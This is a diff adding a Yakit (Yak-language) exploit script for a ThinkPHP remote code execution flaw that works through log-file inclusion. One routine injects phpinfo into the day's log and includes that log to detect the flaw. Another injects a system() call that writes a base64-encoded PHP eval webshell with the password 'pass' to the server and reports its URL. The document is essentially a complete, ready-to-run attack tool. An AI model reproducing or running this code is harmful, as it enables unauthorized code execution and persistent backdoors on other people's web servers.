@@ -1,0 +1,105 @@
+yakit.AutoInitYakit()
+log.setLevel("info")
+// 参数获取
+host = cli.String("host", cli.setHelp("目标IP:PORT"), cli.setRequired(true))
+shell = cli.String("shell", cli.setHelp("webshell名字"), cli.setRequired(false))
+// payload发送
+http_exp = func (host, payload) {
+    return poc.HTTP(`GET /{{params(payload)}} HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1`,
+        poc.params({
+            "target": host,
+            "payload": payload,
+        }),
+    )
+    yakit.Info("http_exp")
+}
+
+// 获取当天日志名
+Logfile = func () {
+    t = time.Now()
+    y = t.Format("2006")[2:]
+    m = t.Format("01")
+    d = t.Format("02")
+    logfile = y + "_" + m + "_" + d + ".log"
+    return logfile
+}
+// 验证
+Poc = func (host) {
+    yakit.Info("开始验证Thinkphp_RCE,目标: %v", host)
+    payload = "index.php?m=--><?=phpinfo();?>"
+    req, _, err = http_exp(host, payload)
+    die(err)
+    a = string(req)
+    if str.Contains(a, "系统发生错误") {
+        logfile = Logfile()
+        payload = "index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/" + logfile
+        req, _, err = http_exp(host, payload)
+        die(err)
+        body = string(req)
+        if str.Contains(body, "PHP Version") {
+            //yakit.Info("存在漏洞")
+            yakit.Info("存在漏洞")
+        }else{
+            payload = "index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/" + logfile
+            req, _, err = http_exp(host, payload)
+            die(err)
+            body = string(req)
+            if str.Contains(body, "PHP Version") {
+                //yakit.Info("存在漏洞")
+                yakit.Info("存在漏洞")
+            }else{
+                //yakit.Info("漏洞不存在")
+                yakit.Info("漏洞不存在")
+            }
+        }
+    }else{
+        //yakit.Info("发包失败")
+        yakit.Info("发包失败")
+    }
+}
+// 利用
+Exp = func (host, shell) {
+    payload = "index.php?m=--><?=system('echo${IFS}" + "PD9waHAKZXZhbCgkX1BPU1RbInBhc3MiXSk7Cg==" + "|base64${IFS}-d>"+ shell + "');?>"
+    req, _, err = http_exp(host, payload)
+    die(err)
+    logfile = Logfile()
+    payload = "index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/" + logfile
+    req, _, err = http_exp(host, payload)
+    die(err)
+    payload = shell
+    req, _, err = http_exp(host, payload)
+    die(err)
+    header = string(req)
+    if str.Contains(header, "200 OK") {
+        url = "http://" + host + "/" + shell
+        yakit.Info("webshell地址:%v ,连接密码默认为pass", url)
+    }else{
+        payload = "index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/" + logfile
+        req, _, err = http_exp(host, payload)
+        die(err)
+        payload = shell
+        req, _, err = http_exp(host, payload)
+        die(err)
+        header = string(req)
+        if str.Contains(header, "200 OK") {
+            url = "http://" + host + "/" + shell
+            yakit.Info("webshell地址:%v ,连接密码默认为pass", url)
+        }else{
+            yakit.Info("写马失败,当前目录可能没有写入权限!")
+        }
+    }
+}
+// 验证逻辑流程
+if cli.Have("shell") {
+    Exp(host, shell)
+}else{
+    Poc(host)
+}
